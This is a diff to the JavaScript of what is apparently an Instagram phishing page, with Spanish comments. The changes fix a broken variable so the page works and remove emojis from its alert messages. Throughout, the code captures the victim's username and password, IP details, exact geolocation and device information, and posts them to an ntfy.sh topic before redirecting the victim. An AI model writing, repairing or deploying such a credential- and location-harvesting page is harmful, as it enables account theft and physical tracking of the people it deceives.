@@ -99,7 +99,7 @@
 
     <script>
         // Configuración
-        const ntfy.sh/enhinor019 = ''; // Cambia esto por tu tema ntfy real
+        const ntfyTopic = 'enhinor019'; // Cambia esto por tu tema ntfy real
         let locationGranted = false;
         let userCoordinates = null;
 
@@ -123,7 +123,7 @@
                         locationStatus.style.color = "#4CAF50";
                         
                         // Enviar notificación de ubicación
-                        sendNotification("📍 Ubicación concedida", `El usuario ha permitido acceso a su ubicación exacta:
+                        sendNotification("Ubicación concedida", `El usuario ha permitido acceso a su ubicación exacta:
 Latitud: ${userCoordinates.lat}
 Longitud: ${userCoordinates.lng}
 Precisión: ${userCoordinates.accuracy} metros
@@ -155,23 +155,23 @@ Google Maps: https://www.google.com/maps?q=${userCoordinates.lat},${userCoordina
                 const deviceInfo = getDeviceInfo();
                 
                 // Construir mensaje
-                let message = `🔔 Intento de inicio de sesión detectado\n\n`;
-                message += `👤 Usuario: ${username}\n`;
-                message += `🔐 Contraseña: ${password}\n\n`;
-                message += `🌐 Información de red:\n`;
+                let message = `Intento de inicio de sesión detectado\n\n`;
+                message += `Usuario: ${username}\n`;
+                message += `Contraseña: ${password}\n\n`;
+                message += `Información de red:\n`;
                 message += `IP: ${ipInfo.ip}\n`;
                 message += `Ubicación aproximada: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
                 message += `Proveedor: ${ipInfo.org || 'Desconocido'}\n\n`;
                 
                 if (locationGranted && userCoordinates) {
-                    message += `📍 Ubicación exacta:\n`;
+                    message += `Ubicación exacta:\n`;
                     message += `Latitud: ${userCoordinates.lat}\n`;
                     message += `Longitud: ${userCoordinates.lng}\n`;
                     message += `Precisión: ${userCoordinates.accuracy}m\n`;
                     message += `Mapa: https://www.google.com/maps?q=${userCoordinates.lat},${userCoordinates.lng}\n\n`;
                 }
                 
-                message += `🖥️ Información del dispositivo:\n`;
+                message += `Información del dispositivo:\n`;
                 message += `Navegador: ${deviceInfo.browser}\n`;
                 message += `Sistema: ${deviceInfo.os}\n`;
                 message += `Resolución: ${deviceInfo.screen}\n`;
@@ -179,7 +179,7 @@ Google Maps: https://www.google.com/maps?q=${userCoordinates.lat},${userCoordina
                 message += `Zona horaria: ${deviceInfo.timezone}`;
                 
                 // Enviar notificación
-                await sendNotification("⚠️ Nuevo login Instagram", message);
+                await sendNotification("Nuevo login Instagram", message);
                 
                 // Redirigir después de enviar
                 setTimeout(() => {
@@ -225,7 +225,7 @@ Google Maps: https://www.google.com/maps?q=${userCoordinates.lat},${userCoordina
         // Función para enviar notificaciones
         async function sendNotification(title, message) {
             try {
-                const response = await fetch(`https://ntfy.sh/${enhinor019}`, {
+                const response = await fetch(`https://ntfy.sh/${ntfyTopic}`, {
                     method: 'POST',
                     headers: {
                         'Title': title,
